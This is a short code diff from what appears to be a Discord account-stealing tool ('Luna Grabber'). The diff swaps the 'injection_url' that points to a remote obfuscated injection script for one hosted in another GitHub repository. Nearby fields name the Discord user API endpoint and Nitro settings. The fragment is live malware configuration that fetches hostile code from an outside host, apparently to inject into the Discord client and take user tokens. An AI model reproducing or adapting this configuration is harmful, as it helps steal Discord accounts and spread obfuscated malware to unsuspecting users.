@@ -15,7 +15,7 @@ const args = process.argv,
       'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096',
     embed_color: 5639644,
     injection_url:
-      'https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js',
+      'https://raw.githubusercontent.com/Anyx0ne/obfusication-injection/main/injection-obfuscated.js',
     api: 'https://discord.com/api/v9/users/@me',
     nitro: {
       boost: {
